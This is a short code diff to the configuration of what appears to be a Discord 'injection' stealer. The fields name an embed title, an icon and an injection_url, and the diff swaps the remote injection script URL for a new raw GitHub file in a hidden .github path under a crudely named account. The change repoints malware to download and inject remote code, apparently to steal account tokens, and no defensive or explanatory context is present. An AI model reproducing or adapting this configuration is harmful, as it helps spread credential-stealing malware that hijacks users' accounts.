@@ -14,7 +14,7 @@ const config = {
   embed_name: 'N3w G3n Injection', 
   embed_icon: 'https://megadico.com/ressources/IMAGES/loser.jpg', 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js', 
+  injection_url: 'https://raw.githubusercontent.com/EyeLoveBigBlackHawks/EyeLoveBigBlackHawks/main/.github/inj.js', 
   /**
    
    **/
